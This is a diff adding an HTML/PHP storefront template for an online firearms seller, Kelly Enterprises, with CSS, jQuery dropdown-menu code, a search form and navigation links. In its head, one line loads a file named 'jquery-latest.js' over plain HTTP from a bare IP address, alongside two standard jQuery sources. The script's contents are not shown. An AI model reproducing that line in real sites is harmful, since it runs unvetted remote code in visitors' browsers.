@@ -1,0 +1,295 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<!--$headcontent-->
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<style type="text/css">
+
+body {
+	background-color: #000000;
+	font-family: PTS55F,  PTS75F, pt sans, 'pt_sansregular' ,'PT Sans', "Helvetica Neue", Helvetica, Arial, sans-serif;
+	color: #000000;
+	margin-top: 0;
+	margin-left: 0;
+	margin-right: 0;
+	background-image: url(../../../../images/background.jpg);
+	background-position: top center;
+	background-repeat: no-repeat;
+	background-attachment: scroll;
+}
+	
+
+@font-face {
+    font-family: 'pt_sansregular';
+    src: url('/fonts/PTS55F-webfont.eot');
+    src: url('/fonts/PTS55F-webfont.eot?#iefix') format('embedded-opentype'),
+         url('/fonts/PTS55F-webfont.woff') format('woff'),
+         url('/fonts/PTS55F-webfont.ttf') format('truetype'),
+         url('/fonts/PTS55F-webfont.svg#pt_sansregular') format('svg');
+    font-weight: normal;
+    font-style: normal;
+
+}
+
+
+
+
+@font-face {
+    font-family: 'pt_sansbold';
+    src: url('/fonts/PTS75F-webfont.eot');
+    src: url('/fonts/PTS75F-webfont.eot?#iefix') format('embedded-opentype'),
+         url('/fonts/PTS75F-webfont.woff') format('woff'),
+         url('/fonts/PTS75F-webfont.ttf') format('truetype'),
+         url('/fonts/PTS75F-webfont.svg#pt_sansbold') format('svg');
+    font-weight: normal;
+    font-style: normal;
+
+}
+
+	
+*:focus{
+	outline: none;
+	outline-width: 0;
+	background-repeat: no-repeat;
+	margin-right: auto;
+}
+
+a:link {color: #000000;}
+
+a:visited {color: #000000;}
+
+.link3 a:link {color:#ffffff;}
+
+.link3 a:visited {color: #ffffff;}
+
+.link3 a:hover{color:#ffffff;text-decoration:underline}
+
+.link4 a:link {color:#ffffff;}
+
+.link4 a:visited {color: #ffffff;}
+
+.link4 a:hover{color:#ffffff; text-decoration:underline}
+
+.link5 a:link {color:#ffffff; font-size:smaller  }
+
+.link5 a:visited {color: #ffffff; font-size:smaller }
+
+.link5 a:hover{color:#ffffff; text-decoration:underline;  font-size:smaller }
+
+
+.leftgrey {
+   
+	background-color:#3a3a3a;
+	
+	}
+
+div.wrapper {
+	width:1150px;
+	text-align: center;
+	margin-top: 0;
+	margin-right: auto;
+	margin-bottom: 0;
+	margin-left: auto;
+	padding-bottom: 25px;}
+
+$stylesheet
+
+#apDiv1 {
+	position:absolute;
+	width:1150px;
+	z-index:-10;
+	padding-top: -75px;
+	padding-bottom: -50px;}
+#apDiv2 {
+	position: relative;
+	width: 100%
+	z-index: 100;
+	background-color:#2d2d2d;
+	background-repeat: repeat-x;
+	background-position: center;
+	bottom: 0px;
+	margin-top: 25px;
+	margin-left: auto;
+	margin-right: auto;
+	text-align: center;
+	width: 100%;
+	
+}
+#apDiv3 {
+	position: relative;
+	width: 100%
+	z-index: 100;
+	bottom: 0px;
+margin-left: auto;
+	margin-right: auto;
+	text-align: center;
+	width: 100%;
+	color: #ccc;
+}
+
+
+	.rounded-corners {
+     -moz-border-radius: 5px;
+    -webkit-border-radius: 5px;
+    -khtml-border-radius: 5px;
+    border-radius: 5px;
+	}
+
+</style>
+
+
+<script type="text/javascript" src="http://72.52.177.29/jquery-latest.js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js"> </script>
+
+
+<script type="text/javascript" src="http://code.jquery.com/jquery-latest.js"></script>
+
+
+
+<script type="text/javascript">
+
+ $(document).ready(function(){
+
+
+
+ $("ul.subnav").parent().append("<span></span>"); //Only shows drop down trigger when js is enabled - Adds empty span tag after ul.subnav
+
+
+
+ $("ul.topnav li span").hover(function() { //When trigger is clicked...
+
+
+
+ //Following events are applied to the subnav itself (moving subnav up and down)
+
+ $(this).parent().find("ul.subnav").slideDown('slow').show(); //Drop down the subnav on click
+
+
+
+ $(this).parent().hover(function() {
+
+ }, function(){
+
+ $(this).parent().find("ul.subnav").slideUp('slow'); //When the mouse hovers out of the subnav, move it back up
+
+ });
+
+ //Following events are applied to the trigger (Hover events for the trigger)
+
+ }).hover(function() {
+
+ $(this).addClass("subhover"); //On hover over, add class "subhover"
+
+ }, function(){ //On Hover Out
+
+ $(this).removeClass("subhover"); //On hover out, remove class "subhover"
+
+ });
+
+});
+
+
+
+ $(document).ready(function(){
+
+
+
+ $("ul.subnav2").parent().append("<span></span>"); //Only shows drop down trigger when js is enabled - Adds empty span tag after ul.subnav
+
+
+
+ $("ul.topnav li span").hover(function() { //When trigger is clicked...
+
+
+
+ //Following events are applied to the subnav itself (moving subnav up and down)
+
+ $(this).parent().find("ul.subnav2").slideDown('slow').show(); //Drop down the subnav on click
+
+
+
+ $(this).parent().hover(function() {
+
+ }, function(){
+
+ $(this).parent().find("ul.subnav2").slideUp('slow'); //When the mouse hovers out of the subnav, move it back up
+
+ });
+
+ //Following events are applied to the trigger (Hover events for the trigger)
+
+ }).hover(function() {
+
+ $(this).addClass("subhover"); //On hover over, add class "subhover"
+
+ }, function(){ //On Hover Out
+
+ $(this).removeClass("subhover"); //On hover out, remove class "subhover"
+
+ });
+
+});
+
+</script>
+
+<title></title></head>
+<body>
+
+        <table width="100%" height="200px" border="0" align="center" cellpadding="0" cellspacing="0" background="../../../../images/headerbg.png">
+      <tr>
+        <td align="center" >
+<img src="../../../../images/header.png" style=" z-index: 2000;" alt="" width="1200"  usemap="#Map" border="0"/></td></tr></table>
+<div style="margin-top:20px;">
+      <table width="1170" border="0" cellspacing="0" cellpadding="0" align="center" valign="top" > <tr>  <td width="15"></td><td width="250" height="235" align="center" valign="top"   ><div style="position: relative; width="100%" >
+<div style="position: absolute; top: -70px; left: 980px;"> <table width="100%" border="0" cellspacing="0" cellpadding="0">  <tr> <td>
+<?php echo tep_draw_form('quick_find', tep_href_link(FILENAME_ADVANCED_SEARCH_RESULT, '', 'NONSSL', false), 'get').tep_draw_input_field('keywords', '', 'size="10" maxlength="30" valign="middle" placeholder="Search..." style="width: 115px; height: 10px; padding: 10px 5px 5px 5px; margin: 10px 0 10px 0; background: #FFFFFF; background: -moz-linear-gradient(top, #e9e9e9 0%, #FFFFFF 20%);background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#e9e9e9), color-stop(20%,#e9e9e9));border-radius: 3px 0px 0px 3px; -moz-border-radius: 3px 0px 0px 3px; -webkit-border-radius: 3px 0px 0px 3px; font-family: "Viga",Arial,Helvetica; font-size: 16px; font-weight: bold; color: #4E6170; text-shadow: 1px 1px 0 #FFFFFF;"') . '</td><td  valign="center" align="right" width="25"   >' . tep_hide_session_id() . tep_image_submit('button_quick_find.png', BOX_HEADING_SEARCH);?></td></form>
+</td> </tr></table>
+</div></div>      
+        
+      <img src="../../../../images/2px.png" height="19px"/><br>
+      <table width="278" border="0" cellspacing="0" cellpadding="10" class="leftgrey"  >
+      <tr><td align="left" bgcolor="#333" height="18px"><font color="#ffffff"><span style="font-size:18px;  line-height: 18px;"><b><img src="../../../../images/2px.png" height="2px"/><br>Manufacturers</b></span></font></td></tr>
+       <tr><td align="left"><div class="link4">$manufacturerbox</div></td> </tr>
+      <tr><td align="left" bgcolor="#333" height="18px"><font color="#ffffff"><span style="font-size:18px;  line-height: 18px;"><b><img src="../../../../images/2px.png" height="2px"/><br>Categories</b></span></font></td></tr>
+     <tr><td align="left"><div class="link4">$categorybox</div></td></tr><tr>
+   	          <td align="left"><div class="link4">$search_filterbox</div></td>
+       	    </tr></table> </td>
+        
+         
+ <td width="" valign="top" align="left"   bgcolor="#FFFFFF"  style="padding-left:15px; padding-right:15px">
+     <img src="../../../../images/2px.png" width="2" height="13px"/><br/> $content <br/>     </td></tr></table></td>
+</tr></table></div>
+
+
+
+
+<div id="apDiv2">
+  <table width="1200px" height="65" border="0" align="center" cellpadding="0" cellspacing="0" > <tr ><!--style="background-color:#1f1f1f;"-->
+<td colspan="3" valign="top" align="left"  height="20"><br/>
+  <span class="link3" style="font-size:10px; color:#ffffff">$breadcrumbs<br>Copyright  2014 <a href="http://www.outdoorbusinessnetwork.com" target="_blank">Outdoor Business Network</a> | Powered by <a href="http://www.go4outdoors.com" target="_blank">OBN</a> | <a href="privacy.php">Privacy</a> </span></td> 
+</tr> </table> </div> 
+
+
+
+
+<map name="Map" id="Map">
+  <area shape="rect" coords="33,24,822,184" href="http://www.kellyenterprises.net/" />
+  <area shape="rect" coords="1012,118,1171,176" href="http://www.kellyenterprises.net/how-to-order.html"  title="How To Order"/>
+<area shape="rect" coords="922,7,962,31" href="checkout_shipping.php" title="Checkout" />
+  <area shape="rect" coords="881,5,910,31" href="account.php" title="My Account" />
+  <area shape="rect" coords="833,4,863,30" href="shopping_cart.php" title="My Cart" />
+  <area shape="circle" coords="935,147,26" href="https://www.facebook.com/pages/Kellyenterprisesnet/612972568740766" target="_blank"  title="Facebook"/>
+  <area shape="circle" coords="986,146,26" href="https://www.youtube.com/channel/UCf84dbGnW0Cg3ONPHLG6_Qg" target="_blank"  title="Youtube"/>
+
+  <area shape="rect" coords="919,56,1162,81" href="mailto:cmmalta2@comcast.net" />
+  <area shape="rect" coords="291,192,561,225" href="/index.php"  title="Production Firearms" />
+  <area shape="rect" coords="99,190,275,227" href="http://www.kellyenterprises.net/firearms.html"  title="Rare Firearms" />
+  <area shape="rect" coords="33,190,94,227" href="http://www.kellyenterprises.net"  title="Home" />
+  <area shape="rect" coords="574,194,645,223" href="http://www.kellyenterprises.net/about-us.html"  title="About Us" />
+  <area shape="rect" coords="655,195,710,223" href="http://www.kellyenterprises.net/links.html"  title="Links" />
+  <area shape="rect" coords="719,192,820,223" href="http://www.kellyenterprises.net/how-to-order.html"  title="How To Order" />
+  <area shape="rect" coords="833,194,913,222" href="http://www.kellyenterprises.net/contact-us.html" title="Contact Us"  />
+</map>
+
+</body></html>
